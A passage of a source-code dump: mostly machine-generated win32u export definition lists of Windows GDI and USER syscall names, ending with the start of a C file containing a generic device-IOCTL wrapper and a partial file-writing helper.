NtUserDragDetect
NtUserDragObject
NtUserDrawAnimatedRects
NtUserDrawCaption
NtUserDrawCaptionTemp
NtUserDrawIconEx
NtUserDrawMenuBarTemp
NtUserEmptyClipboard
NtUserEnableMenuItem
NtUserEnableScrollBar
NtUserEndDeferWindowPosEx
NtUserEndMenu
NtUserEndPaint
NtUserEnumDisplayDevices
NtUserEnumDisplayMonitors
NtUserEnumDisplaySettings
NtUserEvent
NtUserExcludeUpdateRgn
NtUserFillWindow
NtUserFindExistingCursorIcon
NtUserFindWindowEx
NtUserFlashWindowEx
NtUserGetAltTabInfo
NtUserGetAncestor
NtUserGetAppImeLevel
NtUserGetAsyncKeyState
NtUserGetAtomName
NtUserGetCaretBlinkTime
NtUserGetCaretPos
NtUserGetClassInfo
NtUserGetClassName
NtUserGetClipboardData
NtUserGetClipboardFormatName
NtUserGetClipboardOwner
NtUserGetClipboardSequenceNumber
NtUserGetClipboardViewer
NtUserGetClipCursor
NtUserGetComboBoxInfo
NtUserGetControlBrush
NtUserGetControlColor
NtUserGetCPD
NtUserGetCursorFrameInfo
NtUserGetCursorInfo
NtUserGetDC
NtUserGetDCEx
NtUserGetDoubleClickTime
NtUserGetForegroundWindow
NtUserGetGuiResources
NtUserGetGUIThreadInfo
NtUserGetIconInfo
NtUserGetIconSize
NtUserGetImeHotKey
NtUserGetImeInfoEx
NtUserGetInternalWindowPos
NtUserGetKeyboardLayoutList
NtUserGetKeyboardLayoutName
NtUserGetKeyboardState
NtUserGetKeyNameText
NtUserGetKeyState
NtUserGetListBoxInfo
NtUserGetMenuBarInfo
NtUserGetMenuIndex
NtUserGetMenuItemRect
NtUserGetMessage
NtUserGetMouseMovePointsEx
NtUserGetObjectInformation
NtUserGetOpenClipboardWindow
NtUserGetPriorityClipboardFormat
NtUserGetProcessWindowStation
NtUserGetRawInputBuffer
NtUserGetRawInputData
NtUserGetRawInputDeviceInfo
NtUserGetRawInputDeviceList
NtUserGetRegisteredRawInputDevices
NtUserGetScrollBarInfo
NtUserGetSystemMenu
NtUserGetThreadDesktop
NtUserGetThreadState
NtUserGetTitleBarInfo
NtUserGetUpdateRect
NtUserGetUpdateRgn
NtUserGetWindowDC
NtUserGetWindowPlacement
NtUserGetWOWClass
NtUserHardErrorControl
NtUserHideCaret
NtUserHiliteMenuItem
NtUserImpersonateDdeClientWindow
NtUserInitialize
NtUserInitializeClientPfnArrays
NtUserInitTask
NtUserInternalGetWindowText
NtUserInvalidateRect
NtUserInvalidateRgn
NtUserIsClipboardFormatAvailable
NtUserKillTimer
NtUserLoadKeyboardLayoutEx
NtUserLockWindowStation
NtUserLockWindowUpdate
NtUserLockWorkStation
NtUserMapVirtualKeyEx
NtUserMenuItemFromPoint
NtUserMessageCall
NtUserMinMaximize
NtUserMNDragLeave
NtUserMNDragOver
NtUserModifyUserStartupInfoFlags
NtUserMoveWindow
NtUserNotifyIMEStatus
NtUserNotifyProcessCreate
NtUserNotifyWinEvent
NtUserOpenClipboard
NtUserOpenDesktop
NtUserOpenInputDesktop
NtUserOpenWindowStation
NtUserPaintDesktop
NtUserPeekMessage
NtUserPostMessage
NtUserPostThreadMessage
NtUserPrintWindow
NtUserProcessConnect
NtUserQueryInformationThread
NtUserQueryInputContext
NtUserQuerySendMessage
NtUserQueryWindow
NtUserRealChildWindowFromPoint
NtUserRealInternalGetMessage
NtUserRealWaitMessageEx
NtUserRedrawWindow
NtUserRegisterClassExWOW
NtUserRegisterUserApiHook
NtUserRegisterHotKey
NtUserRegisterRawInputDevices
NtUserRegisterTasklist
NtUserRegisterWindowMessage
NtUserRemoveMenu
NtUserRemoveProp
NtUserResolveDesktop
NtUserResolveDesktopForWOW
NtUserSBGetParms
NtUserScrollDC
NtUserScrollWindowEx
NtUserSelectPalette
NtUserSendInput
NtUserSetActiveWindow
NtUserSetAppImeLevel
NtUserSetCapture
NtUserSetClassLong
NtUserSetClassWord
NtUserSetClipboardData
NtUserSetClipboardViewer
NtUserSetConsoleReserveKeys
NtUserSetCursor
NtUserSetCursorContents
NtUserSetCursorIconData
NtUserSetFocus
NtUserSetImeHotKey
NtUserSetImeInfoEx
NtUserSetImeOwnerWindow
NtUserSetInformationProcess
NtUserSetInformationThread
NtUserSetInternalWindowPos
NtUserSetKeyboardState
NtUserSetLogonNotifyWindow
NtUserSetMenu
NtUserSetMenuContextHelpId
NtUserSetMenuDefaultItem
NtUserSetMenuFlagRtoL
NtUserSetObjectInformation
NtUserSetParent
NtUserSetProcessWindowStation
NtUserSetProp
NtUserSetScrollInfo
NtUserSetShellWindowEx
NtUserSetSysColors
NtUserSetSystemCursor
NtUserSetSystemMenu
NtUserSetSystemTimer
NtUserSetThreadDesktop
NtUserSetThreadLayoutHandles
NtUserSetThreadState
NtUserSetTimer
NtUserSetWindowFNID
NtUserSetWindowLong
NtUserSetWindowPlacement
NtUserSetWindowPos
NtUserSetWindowRgn
NtUserSetWindowsHookAW
NtUserSetWindowsHookEx
NtUserSetWindowStationUser
NtUserSetWindowWord
NtUserSetWinEventHook
NtUserShowCaret
NtUserShowScrollBar
NtUserShowWindow
NtUserShowWindowAsync
NtUserSoundSentry
NtUserSwitchDesktop
NtUserSystemParametersInfo
NtUserTestForInteractiveUser
NtUserThunkedMenuInfo
NtUserThunkedMenuItemInfo
NtUserToUnicodeEx
NtUserTrackMouseEvent
NtUserTrackPopupMenuEx
NtUserCalcMenuBar
NtUserPaintMenuBar
NtUserTranslateAccelerator
NtUserTranslateMessage
NtUserUnhookWindowsHookEx
NtUserUnhookWinEvent
NtUserUnloadKeyboardLayout
NtUserUnlockWindowStation
NtUserUnregisterClass
NtUserUnregisterUserApiHook
NtUserUnregisterHotKey
NtUserUpdateInputContext
NtUserUpdateInstance
NtUserUpdateLayeredWindow
NtUserGetLayeredWindowAttributes
NtUserSetLayeredWindowAttributes
NtUserUpdatePerUserSystemParameters
NtUserUserHandleGrantAccess
NtUserValidateHandleSecure
NtUserValidateRect
NtUserValidateTimerCallback
NtUserVkKeyScanEx
NtUserWaitForInputIdle
NtUserWaitForMsgAndEvent
NtUserWaitMessage
NtUserWin32PoolAllocationStats
NtUserWindowFromPoint
NtUserYieldTask
NtUserRemoteConnect
NtUserRemoteRedrawRectangle
NtUserRemoteRedrawScreen
NtUserRemoteStopScreenUpdates
NtUserCtxDisplayIOCtl
NtGdiEngAssociateSurface
NtGdiEngCreateBitmap
NtGdiEngCreateDeviceSurface
NtGdiEngCreateDeviceBitmap
NtGdiEngCreatePalette
NtGdiEngComputeGlyphSet
NtGdiEngCopyBits
NtGdiEngDeletePalette
NtGdiEngDeleteSurface
NtGdiEngEraseSurface
NtGdiEngUnlockSurface
NtGdiEngLockSurface
NtGdiEngBitBlt
NtGdiEngStretchBlt
NtGdiEngPlgBlt
NtGdiEngMarkBandingSurface
NtGdiEngStrokePath
NtGdiEngFillPath
NtGdiEngStrokeAndFillPath
NtGdiEngPaint
NtGdiEngLineTo
NtGdiEngAlphaBlend
NtGdiEngGradientFill
NtGdiEngTransparentBlt
NtGdiEngTextOut
NtGdiEngStretchBltROP
NtGdiXLATEOBJ_cGetPalette
NtGdiXLATEOBJ_iXlate
NtGdiXLATEOBJ_hGetColorTransform
NtGdiCLIPOBJ_bEnum
NtGdiCLIPOBJ_cEnumStart
NtGdiCLIPOBJ_ppoGetPath
NtGdiEngDeletePath
NtGdiEngCreateClip
NtGdiEngDeleteClip
NtGdiBRUSHOBJ_ulGetBrushColor
NtGdiBRUSHOBJ_pvAllocRbrush
NtGdiBRUSHOBJ_pvGetRbrush
NtGdiBRUSHOBJ_hGetColorTransform
NtGdiXFORMOBJ_bApplyXform
NtGdiXFORMOBJ_iGetXform
NtGdiFONTOBJ_vGetInfo
NtGdiFONTOBJ_pxoGetXform
NtGdiFONTOBJ_cGetGlyphs
NtGdiFONTOBJ_pifi
NtGdiFONTOBJ_pfdg
NtGdiFONTOBJ_pQueryGlyphAttrs
NtGdiFONTOBJ_pvTrueTypeFontFile
NtGdiFONTOBJ_cGetAllGlyphHandles
NtGdiSTROBJ_bEnum
NtGdiSTROBJ_bEnumPositionsOnly
NtGdiSTROBJ_bGetAdvanceWidths
NtGdiSTROBJ_vEnumStart
NtGdiSTROBJ_dwGetCodePage
NtGdiPATHOBJ_vGetBounds
NtGdiPATHOBJ_bEnum
NtGdiPATHOBJ_vEnumStart
NtGdiPATHOBJ_vEnumStartClipLines
NtGdiPATHOBJ_bEnumClipLines
NtGdiGetDhpdev
NtGdiEngCheckAbort
NtGdiHT_Get8BPPFormatPalette
NtGdiHT_Get8BPPMaskPalette
NtGdiUpdateTransform
NtGdiSetPUMPDOBJ
NtGdiBRUSHOBJ_DeleteRbrush
NtGdiUMPDEngFreeUserMem
NtGdiDrawStream
NtGdiMakeObjectXferable
NtDxEngGetRedirectionBitmap
NtGdiSetViewportOrgEx
NtGdiSetWindowOrgEx
NtGdiGetFontFamilyInfo
NtGdiOffsetViewportOrgEx
NtGdiOffsetWindowOrgEx
NtUserGetMonitorInfo
NtUserMonitorFromPoint
NtUserMonitorFromRect
NtUserMonitorFromWindow
NtUserSetScrollBarInfo
NtGdiDdDDICreateDCFromMemory
NtGdiDdDDIDestroyDCFromMemory

```

`source/ROS/win32u/win32u/win32u_export_checked.def`:

```def
; MACHINE GENERATED, DO NOT EDIT
EXPORTS
W32pServiceLimit
W32pServiceArgumentTable
NtGdiAbortDoc
NtGdiAbortPath
NtGdiAddFontResourceW
NtGdiAddRemoteFontToDC
NtGdiAddFontMemResourceEx
NtGdiRemoveMergeFont
NtGdiAddRemoteMMInstanceToDC
NtGdiAlphaBlend
NtGdiAngleArc
NtGdiAnyLinkedFonts
NtGdiFontIsLinked
NtGdiArcInternal
NtGdiBeginPath
NtGdiBitBlt
NtGdiCancelDC
NtGdiCheckBitmapBits
NtGdiCloseFigure
NtGdiClearBitmapAttributes
NtGdiClearBrushAttributes
NtGdiColorCorrectPalette
NtGdiCombineRgn
NtGdiCombineTransform
NtGdiComputeXformCoefficients
NtGdiConsoleTextOut
NtGdiConvertMetafileRect
NtGdiCreateBitmap
NtGdiCreateClientObj
NtGdiCreateColorSpace
NtGdiCreateColorTransform
NtGdiCreateCompatibleBitmap
NtGdiCreateCompatibleDC
NtGdiCreateDIBBrush
NtGdiCreateDIBitmapInternal
NtGdiCreateDIBSection
NtGdiCreateEllipticRgn
NtGdiCreateHalftonePalette
NtGdiCreateHatchBrushInternal
NtGdiCreateMetafileDC
NtGdiCreatePaletteInternal
NtGdiCreatePatternBrushInternal
NtGdiCreatePen
NtGdiCreateRectRgn
NtGdiCreateRoundRectRgn
NtGdiCreateServerMetaFile
NtGdiCreateSolidBrush
NtGdiD3dContextCreate
NtGdiD3dContextDestroy
NtGdiD3dContextDestroyAll
NtGdiD3dValidateTextureStageState
NtGdiD3dDrawPrimitives2
NtGdiDdGetDriverState
NtGdiDdAddAttachedSurface
NtGdiDdAlphaBlt
NtGdiDdAttachSurface
NtGdiDdBeginMoCompFrame
NtGdiDdBlt
NtGdiDdCanCreateSurface
NtGdiDdCanCreateD3DBuffer
NtGdiDdColorControl
NtGdiDdCreateDirectDrawObject
NtGdiDdCreateSurface
NtGdiDdCreateD3DBuffer
NtGdiDdCreateMoComp
NtGdiDdCreateSurfaceObject
NtGdiDdDeleteDirectDrawObject
NtGdiDdDeleteSurfaceObject
NtGdiDdDestroyMoComp
NtGdiDdDestroySurface
NtGdiDdDestroyD3DBuffer
NtGdiDdEndMoCompFrame
NtGdiDdFlip
NtGdiDdFlipToGDISurface
NtGdiDdGetAvailDriverMemory
NtGdiDdGetBltStatus
NtGdiDdGetDC
NtGdiDdGetDriverInfo
NtGdiDdGetDxHandle
NtGdiDdGetFlipStatus
NtGdiDdGetInternalMoCompInfo
NtGdiDdGetMoCompBuffInfo
NtGdiDdGetMoCompGuids
NtGdiDdGetMoCompFormats
NtGdiDdGetScanLine
NtGdiDdLock
NtGdiDdLockD3D
NtGdiDdQueryDirectDrawObject
NtGdiDdQueryMoCompStatus
NtGdiDdReenableDirectDrawObject
NtGdiDdReleaseDC
NtGdiDdRenderMoComp
NtGdiDdResetVisrgn
NtGdiDdSetColorKey
NtGdiDdSetExclusiveMode
NtGdiDdSetGammaRamp
NtGdiDdCreateSurfaceEx
NtGdiDdSetOverlayPosition
NtGdiDdUnattachSurface
NtGdiDdUnlock
NtGdiDdUnlockD3D
NtGdiDdUpdateOverlay
NtGdiDdWaitForVerticalBlank
NtGdiDvpCanCreateVideoPort
NtGdiDvpColorControl
NtGdiDvpCreateVideoPort
NtGdiDvpDestroyVideoPort
NtGdiDvpFlipVideoPort
NtGdiDvpGetVideoPortBandwidth
NtGdiDvpGetVideoPortField
NtGdiDvpGetVideoPortFlipStatus
NtGdiDvpGetVideoPortInputFormats
NtGdiDvpGetVideoPortLine
NtGdiDvpGetVideoPortOutputFormats
NtGdiDvpGetVideoPortConnectInfo
NtGdiDvpGetVideoSignalStatus
NtGdiDvpUpdateVideoPort
NtGdiDvpWaitForVideoPortSync
NtGdiDvpAcquireNotification
NtGdiDvpReleaseNotification
NtGdiDxgGenericThunk
NtGdiDeleteClientObj
NtGdiDeleteColorSpace
NtGdiDeleteColorTransform
NtGdiDeleteObjectApp
NtGdiDescribePixelFormat
NtGdiGetPerBandInfo
NtGdiDoBanding
NtGdiDoPalette
NtGdiDrawEscape
NtGdiEllipse
NtGdiEnableEudc
NtGdiEndDoc
NtGdiEndPage
NtGdiEndPath
NtGdiEnumFontChunk
NtGdiEnumFontClose
NtGdiEnumFontOpen
NtGdiEnumObjects
NtGdiEqualRgn
NtGdiEudcLoadUnloadLink
NtGdiExcludeClipRect
NtGdiExtCreatePen
NtGdiExtCreateRegion
NtGdiExtEscape
NtGdiExtFloodFill
NtGdiExtGetObjectW
NtGdiExtSelectClipRgn
NtGdiExtTextOutW
NtGdiFillPath
NtGdiFillRgn
NtGdiFlattenPath
NtGdiFlush
NtGdiForceUFIMapping
NtGdiFrameRgn
NtGdiFullscreenControl
NtGdiGetAndSetDCDword
NtGdiGetAppClipBox
NtGdiGetBitmapBits
NtGdiGetBitmapDimension
NtGdiGetBoundsRect
NtGdiGetCharABCWidthsW
NtGdiGetCharacterPlacementW
NtGdiGetCharSet
NtGdiGetCharWidthW
NtGdiGetCharWidthInfo
NtGdiGetColorAdjustment
NtGdiGetColorSpaceforBitmap
NtGdiGetDCDword
NtGdiGetDCforBitmap
NtGdiGetDCObject
NtGdiGetDCPoint
NtGdiGetDeviceCaps
NtGdiGetDeviceGammaRamp
NtGdiGetDeviceCapsAll
NtGdiGetDIBitsInternal
NtGdiGetETM
NtGdiGetEudcTimeStampEx
NtGdiGetFontData
NtGdiGetFontResourceInfoInternalW
NtGdiGetGlyphIndicesW
NtGdiGetGlyphIndicesWInternal
NtGdiGetGlyphOutline
NtGdiGetKerningPairs
NtGdiGetLinkedUFIs
NtGdiGetMiterLimit
NtGdiGetMonitorID
NtGdiGetNearestColor
NtGdiGetNearestPaletteIndex
NtGdiGetObjectBitmapHandle
NtGdiGetOutlineTextMetricsInternalW
NtGdiGetPath
NtGdiGetPixel
NtGdiGetRandomRgn
NtGdiGetRasterizerCaps
NtGdiGetRealizationInfo
NtGdiGetRegionData
NtGdiGetRgnBox
NtGdiGetServerMetaFileBits
NtGdiGetSpoolMessage
NtGdiGetStats
NtGdiGetStockObject
NtGdiGetStringBitmapW
NtGdiGetSystemPaletteUse
NtGdiGetTextCharsetInfo
NtGdiGetTextExtent
NtGdiGetTextExtentExW
NtGdiGetTextFaceW
NtGdiGetTextMetricsW
NtGdiGetTransform
NtGdiGetUFI
NtGdiGetEmbUFI
NtGdiGetUFIPathname
NtGdiGetEmbedFonts
NtGdiChangeGhostFont
NtGdiAddEmbFontToDC
NtGdiGetFontUnicodeRanges
NtGdiGetWidthTable
NtGdiGradientFill
NtGdiHfontCreate
NtGdiIcmBrushInfo
NtGdiInit
NtGdiInitSpool
NtGdiIntersectClipRect
NtGdiInvertRgn
NtGdiLineTo
NtGdiMakeFontDir
NtGdiMakeInfoDC
NtGdiMaskBlt
NtGdiModifyWorldTransform
NtGdiMonoBitmap
NtGdiMoveTo
NtGdiOffsetClipRgn
NtGdiOffsetRgn
NtGdiOpenDCW
NtGdiPatBlt
NtGdiPolyPatBlt
NtGdiPathToRegion
NtGdiPlgBlt
NtGdiPolyDraw
NtGdiPolyPolyDraw
NtGdiPolyTextOutW
NtGdiPtInRegion
NtGdiPtVisible
NtGdiQueryFonts
NtGdiQueryFontAssocInfo
NtGdiRectangle
NtGdiRectInRegion
NtGdiRectVisible
NtGdiRemoveFontResourceW
NtGdiRemoveFontMemResourceEx
NtGdiResetDC
NtGdiResizePalette
NtGdiRestoreDC
NtGdiRoundRect
NtGdiSaveDC
NtGdiScaleViewportExtEx
NtGdiScaleWindowExtEx
NtGdiSelectBitmap
NtGdiSelectBrush
NtGdiSelectClipPath
NtGdiSelectFont
NtGdiSelectPen
NtGdiSetBitmapAttributes
NtGdiSetBitmapBits
NtGdiSetBitmapDimension
NtGdiSetBoundsRect
NtGdiSetBrushAttributes
NtGdiSetBrushOrg
NtGdiSetColorAdjustment
NtGdiSetColorSpace
NtGdiSetDeviceGammaRamp
NtGdiSetDIBitsToDeviceInternal
NtGdiSetFontEnumeration
NtGdiSetFontXform
NtGdiSetIcmMode
NtGdiSetLinkedUFIs
NtGdiSetMagicColors
NtGdiSetMetaRgn
NtGdiSetMiterLimit
NtGdiGetDeviceWidth
NtGdiMirrorWindowOrg
NtGdiSetLayout
NtGdiSetPixel
NtGdiSetPixelFormat
NtGdiSetRectRgn
NtGdiSetSystemPaletteUse
NtGdiSetTextJustification
NtGdiSetupPublicCFONT
NtGdiSetVirtualResolution
NtGdiSetSizeDevice
NtGdiStartDoc
NtGdiStartPage
NtGdiStretchBlt
NtGdiStretchDIBitsInternal
NtGdiStrokeAndFillPath
NtGdiStrokePath
NtGdiSwapBuffers
NtGdiTransformPoints
NtGdiTransparentBlt
NtGdiUnloadPrinterDriver
NtGdiUnmapMemFont
NtGdiUnrealizeObject
NtGdiUpdateColors
NtGdiWidenPath
NtUserActivateKeyboardLayout
NtUserAlterWindowStyle
NtUserAssociateInputContext
NtUserAttachThreadInput
NtUserBeginPaint
NtUserBitBltSysBmp
NtUserBlockInput
NtUserBuildHimcList
NtUserBuildHwndList
NtUserBuildNameList
NtUserBuildPropList
NtUserCallHwnd
NtUserCallHwndLock
NtUserCallHwndOpt
NtUserCallHwndParam
NtUserCallHwndParamLock
NtUserCallMsgFilter
NtUserCallNextHookEx
NtUserCallNoParam
NtUserCallOneParam
NtUserCallTwoParam
NtUserChangeClipboardChain
NtUserChangeDisplaySettings
NtUserCheckImeHotKey
NtUserCheckMenuItem
NtUserChildWindowFromPointEx
NtUserClipCursor
NtUserCloseClipboard
NtUserCloseDesktop
NtUserCloseWindowStation
NtUserConsoleControl
NtUserConvertMemHandle
NtUserCopyAcceleratorTable
NtUserCountClipboardFormats
NtUserCreateAcceleratorTable
NtUserCreateCaret
NtUserCreateDesktop
NtUserCreateInputContext
NtUserCreateLocalMemHandle
NtUserCreateWindowEx
NtUserCreateWindowStation
NtUserDdeGetQualityOfService
NtUserDdeInitialize
NtUserDdeSetQualityOfService
NtUserDeferWindowPos
NtUserDefSetText
NtUserDeleteMenu
NtUserDestroyAcceleratorTable
NtUserDestroyCursor
NtUserDestroyInputContext
NtUserDestroyMenu
NtUserDestroyWindow
NtUserDisableThreadIme
NtUserDispatchMessage
NtUserDragDetect
NtUserDragObject
NtUserDrawAnimatedRects
NtUserDrawCaption
NtUserDrawCaptionTemp
NtUserDrawIconEx
NtUserDrawMenuBarTemp
NtUserEmptyClipboard
NtUserEnableMenuItem
NtUserEnableScrollBar
NtUserEndDeferWindowPosEx
NtUserEndMenu
NtUserEndPaint
NtUserEnumDisplayDevices
NtUserEnumDisplayMonitors
NtUserEnumDisplaySettings
NtUserEvent
NtUserExcludeUpdateRgn
NtUserFillWindow
NtUserFindExistingCursorIcon
NtUserFindWindowEx
NtUserFlashWindowEx
NtUserGetAltTabInfo
NtUserGetAncestor
NtUserGetAppImeLevel
NtUserGetAsyncKeyState
NtUserGetAtomName
NtUserGetCaretBlinkTime
NtUserGetCaretPos
NtUserGetClassInfo
NtUserGetClassName
NtUserGetClipboardData
NtUserGetClipboardFormatName
NtUserGetClipboardOwner
NtUserGetClipboardSequenceNumber
NtUserGetClipboardViewer
NtUserGetClipCursor
NtUserGetComboBoxInfo
NtUserGetControlBrush
NtUserGetControlColor
NtUserGetCPD
NtUserGetCursorFrameInfo
NtUserGetCursorInfo
NtUserGetDC
NtUserGetDCEx
NtUserGetDoubleClickTime
NtUserGetForegroundWindow
NtUserGetGuiResources
NtUserGetGUIThreadInfo
NtUserGetIconInfo
NtUserGetIconSize
NtUserGetImeHotKey
NtUserGetImeInfoEx
NtUserGetInternalWindowPos
NtUserGetKeyboardLayoutList
NtUserGetKeyboardLayoutName
NtUserGetKeyboardState
NtUserGetKeyNameText
NtUserGetKeyState
NtUserGetListBoxInfo
NtUserGetMenuBarInfo
NtUserGetMenuIndex
NtUserGetMenuItemRect
NtUserGetMessage
NtUserGetMouseMovePointsEx
NtUserGetObjectInformation
NtUserGetOpenClipboardWindow
NtUserGetPriorityClipboardFormat
NtUserGetProcessWindowStation
NtUserGetRawInputBuffer
NtUserGetRawInputData
NtUserGetRawInputDeviceInfo
NtUserGetRawInputDeviceList
NtUserGetRegisteredRawInputDevices
NtUserGetScrollBarInfo
NtUserGetSystemMenu
NtUserGetThreadDesktop
NtUserGetThreadState
NtUserGetTitleBarInfo
NtUserGetUpdateRect
NtUserGetUpdateRgn
NtUserGetWindowDC
NtUserGetWindowPlacement
NtUserGetWOWClass
NtUserHardErrorControl
NtUserHideCaret
NtUserHiliteMenuItem
NtUserImpersonateDdeClientWindow
NtUserInitialize
NtUserInitializeClientPfnArrays
NtUserInitTask
NtUserInternalGetWindowText
NtUserInvalidateRect
NtUserInvalidateRgn
NtUserIsClipboardFormatAvailable
NtUserKillTimer
NtUserLoadKeyboardLayoutEx
NtUserLockWindowStation
NtUserLockWindowUpdate
NtUserLockWorkStation
NtUserMapVirtualKeyEx
NtUserMenuItemFromPoint
NtUserMessageCall
NtUserMinMaximize
NtUserMNDragLeave
NtUserMNDragOver
NtUserModifyUserStartupInfoFlags
NtUserMoveWindow
NtUserNotifyIMEStatus
NtUserNotifyProcessCreate
NtUserNotifyWinEvent
NtUserOpenClipboard
NtUserOpenDesktop
NtUserOpenInputDesktop
NtUserOpenWindowStation
NtUserPaintDesktop
NtUserPeekMessage
NtUserPostMessage
NtUserPostThreadMessage
NtUserPrintWindow
NtUserProcessConnect
NtUserQueryInformationThread
NtUserQueryInputContext
NtUserQuerySendMessage
NtUserQueryWindow
NtUserRealChildWindowFromPoint
NtUserRealInternalGetMessage
NtUserRealWaitMessageEx
NtUserRedrawWindow
NtUserRegisterClassExWOW
NtUserRegisterUserApiHook
NtUserRegisterHotKey
NtUserRegisterRawInputDevices
NtUserRegisterTasklist
NtUserRegisterWindowMessage
NtUserRemoveMenu
NtUserRemoveProp
NtUserResolveDesktop
NtUserResolveDesktopForWOW
NtUserSBGetParms
NtUserScrollDC
NtUserScrollWindowEx
NtUserSelectPalette
NtUserSendInput
NtUserSetActiveWindow
NtUserSetAppImeLevel
NtUserSetCapture
NtUserSetClassLong
NtUserSetClassWord
NtUserSetClipboardData
NtUserSetClipboardViewer
NtUserSetConsoleReserveKeys
NtUserSetCursor
NtUserSetCursorContents
NtUserSetCursorIconData
NtUserSetFocus
NtUserSetImeHotKey
NtUserSetImeInfoEx
NtUserSetImeOwnerWindow
NtUserSetInformationProcess
NtUserSetInformationThread
NtUserSetInternalWindowPos
NtUserSetKeyboardState
NtUserSetLogonNotifyWindow
NtUserSetMenu
NtUserSetMenuContextHelpId
NtUserSetMenuDefaultItem
NtUserSetMenuFlagRtoL
NtUserSetObjectInformation
NtUserSetParent
NtUserSetProcessWindowStation
NtUserSetProp
NtUserSetScrollInfo
NtUserSetShellWindowEx
NtUserSetSysColors
NtUserSetSystemCursor
NtUserSetSystemMenu
NtUserSetSystemTimer
NtUserSetThreadDesktop
NtUserSetThreadLayoutHandles
NtUserSetThreadState
NtUserSetTimer
NtUserSetWindowFNID
NtUserSetWindowLong
NtUserSetWindowPlacement
NtUserSetWindowPos
NtUserSetWindowRgn
NtUserSetWindowsHookAW
NtUserSetWindowsHookEx
NtUserSetWindowStationUser
NtUserSetWindowWord
NtUserSetWinEventHook
NtUserShowCaret
NtUserShowScrollBar
NtUserShowWindow
NtUserShowWindowAsync
NtUserSoundSentry
NtUserSwitchDesktop
NtUserSystemParametersInfo
NtUserTestForInteractiveUser
NtUserThunkedMenuInfo
NtUserThunkedMenuItemInfo
NtUserToUnicodeEx
NtUserTrackMouseEvent
NtUserTrackPopupMenuEx
NtUserCalcMenuBar
NtUserPaintMenuBar
NtUserTranslateAccelerator
NtUserTranslateMessage
NtUserUnhookWindowsHookEx
NtUserUnhookWinEvent
NtUserUnloadKeyboardLayout
NtUserUnlockWindowStation
NtUserUnregisterClass
NtUserUnregisterUserApiHook
NtUserUnregisterHotKey
NtUserUpdateInputContext
NtUserUpdateInstance
NtUserUpdateLayeredWindow
NtUserGetLayeredWindowAttributes
NtUserSetLayeredWindowAttributes
NtUserUpdatePerUserSystemParameters
NtUserUserHandleGrantAccess
NtUserValidateHandleSecure
NtUserValidateRect
NtUserValidateTimerCallback
NtUserVkKeyScanEx
NtUserWaitForInputIdle
NtUserWaitForMsgAndEvent
NtUserWaitMessage
NtUserWin32PoolAllocationStats
NtUserWindowFromPoint
NtUserYieldTask
NtUserRemoteConnect
NtUserRemoteRedrawRectangle
NtUserRemoteRedrawScreen
NtUserRemoteStopScreenUpdates
NtUserCtxDisplayIOCtl
NtGdiEngAssociateSurface
NtGdiEngCreateBitmap
NtGdiEngCreateDeviceSurface
NtGdiEngCreateDeviceBitmap
NtGdiEngCreatePalette
NtGdiEngComputeGlyphSet
NtGdiEngCopyBits
NtGdiEngDeletePalette
NtGdiEngDeleteSurface
NtGdiEngEraseSurface
NtGdiEngUnlockSurface
NtGdiEngLockSurface
NtGdiEngBitBlt
NtGdiEngStretchBlt
NtGdiEngPlgBlt
NtGdiEngMarkBandingSurface
NtGdiEngStrokePath
NtGdiEngFillPath
NtGdiEngStrokeAndFillPath
NtGdiEngPaint
NtGdiEngLineTo
NtGdiEngAlphaBlend
NtGdiEngGradientFill
NtGdiEngTransparentBlt
NtGdiEngTextOut
NtGdiEngStretchBltROP
NtGdiXLATEOBJ_cGetPalette
NtGdiXLATEOBJ_iXlate
NtGdiXLATEOBJ_hGetColorTransform
NtGdiCLIPOBJ_bEnum
NtGdiCLIPOBJ_cEnumStart
NtGdiCLIPOBJ_ppoGetPath
NtGdiEngDeletePath
NtGdiEngCreateClip
NtGdiEngDeleteClip
NtGdiBRUSHOBJ_ulGetBrushColor
NtGdiBRUSHOBJ_pvAllocRbrush
NtGdiBRUSHOBJ_pvGetRbrush
NtGdiBRUSHOBJ_hGetColorTransform
NtGdiXFORMOBJ_bApplyXform
NtGdiXFORMOBJ_iGetXform
NtGdiFONTOBJ_vGetInfo
NtGdiFONTOBJ_pxoGetXform
NtGdiFONTOBJ_cGetGlyphs
NtGdiFONTOBJ_pifi
NtGdiFONTOBJ_pfdg
NtGdiFONTOBJ_pQueryGlyphAttrs
NtGdiFONTOBJ_pvTrueTypeFontFile
NtGdiFONTOBJ_cGetAllGlyphHandles
NtGdiSTROBJ_bEnum
NtGdiSTROBJ_bEnumPositionsOnly
NtGdiSTROBJ_bGetAdvanceWidths
NtGdiSTROBJ_vEnumStart
NtGdiSTROBJ_dwGetCodePage
NtGdiPATHOBJ_vGetBounds
NtGdiPATHOBJ_bEnum
NtGdiPATHOBJ_vEnumStart
NtGdiPATHOBJ_vEnumStartClipLines
NtGdiPATHOBJ_bEnumClipLines
NtGdiGetDhpdev
NtGdiEngCheckAbort
NtGdiHT_Get8BPPFormatPalette
NtGdiHT_Get8BPPMaskPalette
NtGdiUpdateTransform
NtGdiSetPUMPDOBJ
NtGdiBRUSHOBJ_DeleteRbrush
NtGdiUMPDEngFreeUserMem
NtGdiDrawStream
NtUserDbgWin32HeapFail
NtUserDbgWin32HeapStat
NtUserSetDbgTag
NtUserSetDbgTagCount
NtUserSetRipFlags
NtGdiMakeObjectXferable
NtDxEngGetRedirectionBitmap
NtGdiSetViewportOrgEx
NtGdiSetWindowOrgEx
NtGdiGetFontFamilyInfo
NtGdiOffsetViewportOrgEx
NtGdiOffsetWindowOrgEx
NtUserGetMonitorInfo
NtUserMonitorFromPoint
NtUserMonitorFromRect
NtUserMonitorFromWindow
NtUserSetScrollBarInfo
NtGdiDdDDICreateDCFromMemory
NtGdiDdDDIDestroyDCFromMemory

```

`source/SecTrash/asusgio2.c`:

```c
NTSTATUS CallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG IoControlCode,
    _In_ PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _In_opt_ PVOID OutputBuffer,
    _In_opt_ ULONG OutputBufferLength)
{
    BOOL bResult = FALSE;
    IO_STATUS_BLOCK ioStatus;

    return NtDeviceIoControlFile(DeviceHandle,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength);

}

BOOL supWriteBufferToFile(
    _In_ LPWSTR lpFileName,
    _In_ PVOID Buffer,
    _In_ DWORD BufferSize
)
{
    HANDLE hFile;
    DWORD bytesIO;

    hFile = CreateFileW(lpFileName,
        GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);

